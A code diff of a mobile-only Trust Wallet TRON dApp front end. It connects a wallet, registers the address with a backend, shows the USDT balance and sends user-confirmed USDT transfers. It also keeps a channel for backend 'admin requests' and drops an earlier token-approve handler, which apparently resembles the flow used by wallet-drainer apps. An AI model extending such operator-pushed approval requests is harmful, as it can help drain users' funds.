-  setEnvironmentText();
-  setWalletText("Not connected");
-  setStatus("Ready");
-  setBackendStatus("Backend: waiting for mobile session");
-  renderAdminRequests();
-  initWalletClient();
-  syncButtons();
-
+async function connectTrustWallet({ auto = false } = {}) {
   if (!isMobileDevice) {
-    setStatus("Desktop blocked: open this dApp inside Trust Wallet mobile app.");
+    setConnectStatus("Mobile only. Open this dApp in Trust Wallet mobile.");
+    syncUiState();
     return;
   }
 
-  startBackendSync();
-  await fetchPendingRequestsFromBackend();
+  requireWallet();
+  if (connecting) return;
 
-  if (!hasTrustUa && !hasTrustProviderHint) {
-    el.pairingHint.textContent =
-      "This dApp is Trust-Wallet-only. Press connect and it will open Trust Wallet.";
-  }
+  connecting = true;
+  syncUiState();
+  setConnectStatus(auto ? "Connecting automatically..." : "Connecting...");
 
-  const hasSession = await checkExistingConnection();
-  syncButtons();
-  renderAdminRequests();
+  try {
+    const { address } = await walletClient.connect({
+      onUri: (uri) => {
+        handlePairingUri(uri);
+      },
+    });
 
-  if (hasSession) {
+    connectedAddress = address;
+    setWalletAddress(shortAddress(connectedAddress));
+    setConnectStatus("Wallet connected");
     await registerWalletWithBackend();
-    return;
-  }
-
-  if (walletClient) {
-    await connectTrustWallet({ auto: true });
+    await refreshUsdtBalance();
+  } catch (error) {
+    setConnectStatus("Connection failed. Tap retry.");
+    appendLog("Connect error", { error: String(error) });
+  } finally {
+    connecting = false;
+    syncUiState();
   }
 }
 
+async function disconnectWallet() {
+  if (!walletClient) return;
+  try {
+    await walletClient.disconnect();
+  } catch (error) {
+    appendLog("Disconnect error", { error: String(error) });
+  }
+}
+
+async function refreshUsdtBalance() {
+  if (!connectedAddress) return;
+  try {
+    const contract = await tronWeb.contract().at(USDT_TRON_MAINNET);
+    const result = await contract.balanceOf(connectedAddress).call();
+    usdtBalanceRaw = toRawBigInt(result);
+    const formatted = formatRawAmount(usdtBalanceRaw, USDT_DECIMALS);
+    el.balanceValue.textContent = `Balance: ${formatted} USDT`;
+  } catch (error) {
+    el.balanceValue.textContent = "Balance: unavailable";
+    appendLog("USDT balance read failed", { error: String(error) });
+  }
+}
+
+function setAmountToMax() {
+  if (!connectedAddress) return;
+  const formatted = formatRawAmount(usdtBalanceRaw, USDT_DECIMALS);
+  el.amountInput.value = formatted;
+  updateFiatApprox();
+}
+
+async function sendUsdt() {
+  if (!connectedAddress) {
+    throw new Error("Connect wallet first");
+  }
+
+  const to = el.recipientInput.value.trim();
+  const amount = el.amountInput.value.trim();
+  requireAddress(to, "Recipient address");
+  if (!amount) throw new Error("Enter amount");
+  if (BigInt(decimalToIntegerString(amount, USDT_DECIMALS)) <= 0n) {
+    throw new Error("Amount must be greater than 0");
+  }
+
+  return transferTrc20Transaction({
+    token: USDT_TRON_MAINNET,
+    to,
+    amount,
+    decimals: USDT_DECIMALS,
+  });
+}
+
+async function handleSendClick() {
+  try {
+    el.sendBtn.disabled = true;
+    setConnectStatus("Waiting for wallet confirmation...");
+    const txid = await sendUsdt();
+    setConnectStatus(`Transaction sent: ${txid}`);
+    appendLog("USDT transfer success", {
+      txid,
+      url: `https://tronscan.org/#/transaction/${txid}`,
+    });
+    await refreshUsdtBalance();
+  } catch (error) {
+    setConnectStatus(`Send failed: ${String(error)}`);
+    appendLog("USDT transfer failed", { error: String(error) });
+  } finally {
+    syncUiState();
+  }
+}
+
+async function handlePaste() {
+  try {
+    if (!navigator.clipboard?.readText) return;
+    const text = await navigator.clipboard.readText();
+    if (text) el.recipientInput.value = text.trim();
+  } catch (error) {
+    appendLog("Clipboard read failed", { error: String(error) });
+  }
+}
+
+async function init() {
+  setBackendStatus("");
+  updateFiatApprox();
+  syncUiState();
+
+  if (!WC_PROJECT_ID) {
+    setConnectStatus("Missing WalletConnect project id");
+    appendLog("Set VITE_WALLETCONNECT_PROJECT_ID in environment");
+    return;
+  }
+
+  initWalletClient();
+  startBackendSync();
+
+  if (!isMobileDevice) {
+    setConnectStatus("Mobile only. Open this dApp in Trust Wallet app.");
+    return;
+  }
+
+  const hadSession = await checkExistingConnection();
+  if (hadSession) {
+    await registerWalletWithBackend();
+    await refreshUsdtBalance();
+    syncUiState();
+    return;
+  }
+
+  await connectTrustWallet({ auto: true });
+}
+
+el.amountInput.addEventListener("input", updateFiatApprox);
+el.maxBtn.addEventListener("click", setAmountToMax);
+el.sendBtn.addEventListener("click", handleSendClick);
+el.pasteBtn.addEventListener("click", handlePaste);
 el.connectBtn.addEventListener("click", () => connectTrustWallet({ auto: false }));
+el.retryConnectBtn.addEventListener("click", () => connectTrustWallet({ auto: false }));
 el.disconnectBtn.addEventListener("click", disconnectWallet);
-el.sendTrxBtn.addEventListener("click", handleSendTrx);
-el.approveBtn.addEventListener("click", handleApprove);
-el.transferTokenBtn.addEventListener("click", handleTokenTransfer);
-el.adminRequests.addEventListener("click", onAdminRequestAction);
+el.adminRequests.addEventListener("click", onRequestAction);
 
 init().catch((error) => {
-  appendLog("Fatal init error", { error: String(error) });
-  setStatus("Initialization failed");
+  appendLog("Init failed", { error: String(error) });
+  setConnectStatus("Initialization failed");
 });
